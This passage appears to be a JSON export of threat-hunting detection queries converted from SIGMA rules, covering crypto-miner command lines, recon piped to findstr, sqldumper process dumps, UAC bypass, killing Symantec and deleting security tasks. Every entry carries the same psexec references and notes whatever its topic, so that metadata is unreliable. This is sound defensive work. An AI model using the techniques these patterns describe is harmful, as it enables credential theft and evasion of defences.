            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" --cpu-priority=\" or tgt.process.cmdline contains \"--donate-level=0\" or tgt.process.cmdline contains \" -o pool.\" or tgt.process.cmdline contains \" --nicehash\" or tgt.process.cmdline contains \" --algo=rx/0 \" or tgt.process.cmdline contains \"stratum+tcp://\" or tgt.process.cmdline contains \"stratum+udp://\" or tgt.process.cmdline contains \"LS1kb25hdGUtbGV2ZWw9\" or tgt.process.cmdline contains \"0tZG9uYXRlLWxldmVsP\" or tgt.process.cmdline contains \"tLWRvbmF0ZS1sZXZlbD\" or tgt.process.cmdline contains \"c3RyYXR1bSt0Y3A6Ly\" or tgt.process.cmdline contains \"N0cmF0dW0rdGNwOi8v\" or tgt.process.cmdline contains \"zdHJhdHVtK3RjcDovL\" or tgt.process.cmdline contains \"c3RyYXR1bSt1ZHA6Ly\" or tgt.process.cmdline contains \"N0cmF0dW0rdWRwOi8v\" or tgt.process.cmdline contains \"zdHJhdHVtK3VkcDovL\") and (not (tgt.process.cmdline contains \" pool.c \" or tgt.process.cmdline contains \" pool.o \" or tgt.process.cmdline contains \"gcc -\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1133
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of other scripts using the Node executable packaged with Adobe Creative Cloud",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127",
                "t1059"
            ],
            "name": "Node Process Executions",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\Adobe Creative Cloud Experience\\libs\\node.exe\" and (not tgt.process.cmdline contains \"Adobe Creative Cloud Experience\\js\"))) | columns tgt.process.image.path,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1134
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a potential recon command where the results are piped to \"findstr\". This is meant to trigger on inline calls of \"cmd.exe\" via the \"/c\" or \"/k\" for example.\nAttackers often time use this technique to extract specific information they require in their reconnaissance phase.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1057"
            ],
            "name": "Recon Command Output Piped To Findstr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"*ipconfig*|*find*\" or tgt.process.cmdline=\"*net*|*find*\" or tgt.process.cmdline=\"*netstat*|*find*\" or tgt.process.cmdline=\"*ping*|*find*\" or tgt.process.cmdline=\"*systeminfo*|*find*\" or tgt.process.cmdline=\"*tasklist*|*find*\" or tgt.process.cmdline=\"*whoami*|*find*\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1135
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process dump via legitimate sqldumper.exe binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Dumping Process via Sqldumper.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sqldumper.exe\" and (tgt.process.cmdline contains \"0x0110\" or tgt.process.cmdline contains \"0x01100:40\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1136
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of format.com with an uncommon filesystem selection that could indicate a defense evasion activity in which \"format.com\" is used to load malicious DLL files or other programs.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Uncommon FileSystem Load Attempt By Format.com",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\format.com\" and tgt.process.cmdline contains \"/fs:\") and (not (tgt.process.cmdline contains \"/fs:exFAT\" or tgt.process.cmdline contains \"/fs:FAT\" or tgt.process.cmdline contains \"/fs:NTFS\" or tgt.process.cmdline contains \"/fs:ReFS\" or tgt.process.cmdline contains \"/fs:UDF\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1137
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of commands that leverage the \"mshtml.dll\" RunHTMLApplication export to run arbitrary code via different protocol handlers (vbscript, javascript, file, http...)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Mshtml.DLL RunHTMLApplication Suspicious Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\..\\\" and tgt.process.cmdline contains \"mshtml\") and (tgt.process.cmdline contains \"#135\" or tgt.process.cmdline contains \"RunHTMLApplication\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1138
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Possible Privilege Escalation via Weak Service Permissions",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.integrityLevel in (\"Medium\",\"S-1-16-8192\"))) and ((tgt.process.cmdline contains \"config\" and tgt.process.cmdline contains \"binPath\") or (tgt.process.cmdline contains \"failure\" and tgt.process.cmdline contains \"command\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1139
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid Image detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Use Short Name Path in Image",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"~1\\\" or tgt.process.image.path contains \"~2\\\") and (not (((src.process.image.path in (\"C:\\Windows\\System32\\Dism.exe\",\"C:\\Windows\\System32\\cleanmgr.exe\")) or (src.process.image.path contains \"\\WebEx\\WebexHost.exe\" or src.process.image.path contains \"\\thor\\thor64.exe\") or tgt.process.displayName=\"InstallShield (R)\" or tgt.process.displayName=\"InstallShield (R) Setup Engine\" or tgt.process.publisher=\"InstallShield Software Corporation\") or ((tgt.process.image.path contains \"\\AppData\\\" and tgt.process.image.path contains \"\\Temp\\\") or (tgt.process.image.path contains \"~1\\unzip.exe\" or tgt.process.image.path contains \"~1\\7zG.exe\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1140
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects tools such as UACMe used to bypass UAC with computerdefaults.exe (UACMe 59)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Tools Using ComputerDefaults",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\")) and tgt.process.image.path=\"C:\\Windows\\System32\\ComputerDefaults.exe\") and (not (src.process.image.path contains \":\\Windows\\System32\" or src.process.image.path contains \":\\Program Files\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1141
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects whether the image specified in a process creation event doesn't refer to an \".exe\" (or other known executable extension) file. This can be caused by process ghosting or other unorthodox methods to start a process.\nThis rule might require some initial baselining to align with some third party tooling in the user environment.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Execution of Suspicious File Type Extension",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((not (tgt.process.image.path contains \".bin\" or tgt.process.image.path contains \".cgi\" or tgt.process.image.path contains \".com\" or tgt.process.image.path contains \".exe\" or tgt.process.image.path contains \".scr\" or tgt.process.image.path contains \".tmp\")) and (not ((tgt.process.image.path in (\"System\",\"Registry\",\"MemCompression\",\"vmmem\")) or tgt.process.image.path contains \":\\Windows\\Installer\\MSI\" or tgt.process.image.path contains \":\\Windows\\System32\\DriverStore\\FileRepository\\\" or (tgt.process.image.path contains \":\\Config.Msi\\\" and (tgt.process.image.path contains \".rbf\" or tgt.process.image.path contains \".rbs\")) or (src.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\") or tgt.process.image.path contains \":\\$Extend\\$Deleted\\\" or (tgt.process.image.path in (\"-\",\"\")) or not (tgt.process.image.path matches \"\\.*\"))) and (not (src.process.image.path contains \":\\ProgramData\\Avira\\\" or (tgt.process.image.path contains \"NVIDIA\\NvBackend\\\" and tgt.process.image.path contains \".dat\") or ((tgt.process.image.path contains \":\\Program Files (x86)\\WINPAKPRO\\\" or tgt.process.image.path contains \":\\Program Files\\WINPAKPRO\\\") and tgt.process.image.path contains \".ngn\") or (tgt.process.image.path contains \":\\Program Files (x86)\\MyQ\\Server\\pcltool.dll\" or tgt.process.image.path contains \":\\Program Files\\MyQ\\Server\\pcltool.dll\") or (tgt.process.image.path contains \"\\AppData\\Local\\Packages\\\" and tgt.process.image.path contains \"\\LocalState\\rootfs\\\") or tgt.process.image.path contains \"\\LZMA_EXE\" or tgt.process.image.path contains \":\\Program Files\\Mozilla Firefox\\\" or (src.process.image.path=\"C:\\Windows\\System32\\services.exe\" and tgt.process.image.path contains \"com.docker.service\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1142
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Dllhost.EXE Execution Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\dllhost.exe\" and (tgt.process.cmdline in (\"dllhost.exe\",\"dllhost\"))) and (not not (tgt.process.cmdline matches \"\\.*\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1143
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects one of the possible scenarios for disabling Symantec Endpoint Protection.\nSymantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism.\nAs a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Taskkill Symantec Endpoint Protection",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"taskkill\" and tgt.process.cmdline contains \" /F \" and tgt.process.cmdline contains \" /IM \" and tgt.process.cmdline contains \"ccSvcHst.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1144
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1615",
                "t1059"
            ],
            "name": "Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"gatherNetworkInfo.vbs\" and (not (tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\wscript.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1145
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of WinRAR in order to compress a file with a \".dmp\"/\".dump\" extension, which could be a step in a process of dump file exfiltration.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Winrar Compressing Dump Files",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rar.exe\" or tgt.process.image.path contains \"\\winrar.exe\") or tgt.process.displayName=\"Command line RAR\") and (tgt.process.cmdline contains \".dmp\" or tgt.process.cmdline contains \".dump\" or tgt.process.cmdline contains \".hdmp\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1146
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Usage Of ShellExec_RunDLL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"ShellExec_RunDLL\" and (tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Temp\\\" or tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"comspec\" or tgt.process.cmdline contains \"iex\" or tgt.process.cmdline contains \"Invoke-\" or tgt.process.cmdline contains \"msiexec\" or tgt.process.cmdline contains \"odbcconf\" or tgt.process.cmdline contains \"regsvr32\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1147
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when adversaries stop services or processes by deleting their respective scheduled tasks in order to conduct data destructive activities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1489"
            ],
            "name": "Delete Important Scheduled Task",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/delete\" and tgt.process.cmdline contains \"/tn\") and (tgt.process.cmdline contains \"\\Windows\\BitLocker\" or tgt.process.cmdline contains \"\\Windows\\ExploitGuard\" or tgt.process.cmdline contains \"\\Windows\\SystemRestore\\SR\" or tgt.process.cmdline contains \"\\Windows\\UpdateOrchestrator\\\" or tgt.process.cmdline contains \"\\Windows\\Windows Defender\\\" or tgt.process.cmdline contains \"\\Windows\\WindowsBackup\\\" or tgt.process.cmdline contains \"\\Windows\\WindowsUpdate\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1148
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects actions caused by the RedMimicry Winnti playbook a automated breach emulations utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1106",
                "t1059",
                "t1218"
            ],
            "name": "HackTool - RedMimicry Winnti Playbook Execution",
